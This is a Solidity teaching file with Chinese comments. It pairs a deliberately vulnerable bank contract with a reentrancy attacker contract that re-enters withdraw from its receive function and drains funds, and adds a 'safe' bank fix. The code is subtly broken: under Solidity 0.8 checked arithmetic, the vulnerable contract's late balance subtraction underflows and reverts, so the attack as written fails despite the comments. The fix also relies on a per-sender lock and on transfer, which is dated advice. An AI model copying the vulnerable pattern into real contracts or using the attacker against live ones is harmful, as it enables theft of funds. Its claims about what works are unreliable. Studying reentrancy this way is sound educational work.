// SPDX-License-Identifier: MIT
pragma solidity >=0.8.20;

// 有重入漏洞的合约
contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    // 存款
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    // 有漏洞的提款函数
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "余额不足");
        
        // 先发送ETH，后更新余额 - 这是漏洞！
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success, "转账失败");
        
        // 余额更新在转账之后，给了攻击者机会
        balances[msg.sender] -= amount;
    }
    
    // 查看余额
    function getBalance() external view returns (uint256) {
        return balances[msg.sender];
    }
    
    // 查看合约余额
    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// 攻击合约
contract ReentrancyAttacker {
    VulnerableBank public bank;
    uint256 public attackCount = 0;
    
    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }
    
    // 开始攻击
    function attack() external payable {
        // 先存款
        bank.deposit{value: msg.value}();
        
        // 然后提款触发攻击
        bank.withdraw(msg.value);
    }
    
    // 恶意合约的receive函数 - 这是攻击的关键！
    receive() external payable {
        if (address(bank).balance >= msg.value && attackCount < 3) {
            attackCount++;
            // 重新调用银行的withdraw函数
            bank.withdraw(msg.value);
        }
    }
    
    // 提取攻击获得的ETH
    function withdrawStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
    
    // 查看攻击合约余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// 安全的银行合约（修复重入漏洞）
contract SafeBank {
    mapping(address => uint256) public balances;
    mapping(address => bool) private locked;
    
    // 防止重入的修饰符
    modifier nonReentrant() {
        require(!locked[msg.sender], "重入被阻止");
        locked[msg.sender] = true;
        _;
        locked[msg.sender] = false;
    }
    
    // 存款
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    // 安全的提款函数
    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "余额不足");
        
        // 先更新余额，后发送ETH - 这是安全的做法
        balances[msg.sender] -= amount;
        
        // 使用transfer而不是call，限制gas
        payable(msg.sender).transfer(amount);
    }
    
    // 更安全的提款函数（使用call但遵循检查-效果-交互模式）
    function withdrawWithCall(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "余额不足");
        
        // 先更新余额
        balances[msg.sender] -= amount;
        
        // 后发送ETH
        (bool success, ) = payable(msg.sender).call{value: amount}("");
        require(success, "转账失败");
    }
    
    // 查看余额
    function getBalance() external view returns (uint256) {
        return balances[msg.sender];
    }
    
    // 查看合约余额
    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
} 